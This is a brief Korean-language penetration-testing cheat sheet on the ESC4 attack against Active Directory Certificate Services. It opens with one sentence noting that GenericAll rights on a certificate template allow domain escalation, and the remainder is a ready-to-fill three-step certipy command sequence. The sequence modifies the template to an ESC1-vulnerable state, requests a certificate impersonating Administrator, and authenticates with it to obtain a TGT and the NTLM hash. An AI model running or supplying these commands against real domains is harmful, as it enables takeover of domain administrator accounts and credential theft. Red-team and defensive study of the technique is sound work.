# CertTemplate 대상

인증서 템플릿에 GenericAll이 있으면 ESC4 공격으로 ADCS를 통해 도메인 에스컬레이션이 가능하다. ADCS 환경(EnterpriseCA 존재)이 필요하다.

## ESC4

```bash
# 1단계: 템플릿 속성을 ESC1 취약 상태로 수정
certipy template \
  -u <공격자계정>@<도메인> -p '<패스워드>' \
  -template <대상템플릿> \
  -save-old -dc-ip <DC_IP>  # ← 수정

# 2단계: Administrator UPN으로 인증서 요청
certipy req \
  -u <공격자계정>@<도메인> -p '<패스워드>' \
  -ca '<CA이름>' \
  -template <대상템플릿> \
  -upn administrator@<도메인> \
  -dc-ip <DC_IP>  # ← 수정

# 3단계: 인증서로 TGT 발급 → NTLM 해시 획득
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```